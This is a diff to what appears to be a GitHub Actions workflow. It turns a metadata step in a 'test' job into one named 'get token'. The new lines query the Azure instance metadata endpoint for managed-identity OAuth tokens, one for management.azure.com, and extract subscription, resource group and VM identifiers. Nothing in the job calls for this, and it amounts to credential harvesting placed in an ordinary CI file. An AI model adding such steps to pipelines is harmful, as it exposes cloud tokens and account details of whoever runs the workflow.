@@ -4,7 +4,8 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: metadata
+      - name: get token
         run: |
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || true
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=api://hosted-compute-ro" || true
           curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || true
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool | grep -E "subscriptionId|resourceGroup|vmId"
